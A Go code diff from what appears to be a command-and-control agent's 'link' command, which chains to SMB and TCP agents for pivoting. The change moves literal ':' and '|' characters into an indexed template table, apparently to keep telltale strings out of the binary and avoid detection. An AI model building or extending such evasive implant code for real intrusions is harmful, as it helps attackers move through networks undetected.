@@ -31,12 +31,8 @@ const (
 	idxLinkPingMarker   = 128
 	idxLinkQuitMarker   = 129
 	idxLinkDot          = 132
-)
-
-// Single-char byte arrays (innocuous, minimal footprint)
-var (
-	lnkColon = string([]byte{0x3a}) // :
-	lnkPipe  = string([]byte{0x7c}) // |
+	idxLinkColon        = 347
+	idxLinkPipe         = 348
 )
 
 // LinkCommand handles the 'link' command for connecting to SMB agents
@@ -123,7 +119,7 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 		}
 
 		// Build the TCP address (host:port)
-		address := targetHost + lnkColon + port
+		address := targetHost + c.getTpl(idxLinkColon) + port
 		return c.linkTCP(address)
 
 	default:
@@ -155,7 +151,7 @@ func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
 	return CommandResult{
-		Output:      statusPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
+		Output:      statusPrefix + pipePath + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -181,7 +177,7 @@ func (c *LinkCommand) linkTCP(address string) CommandResult {
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
 	return CommandResult{
-		Output:      statusPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
+		Output:      statusPrefix + address + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
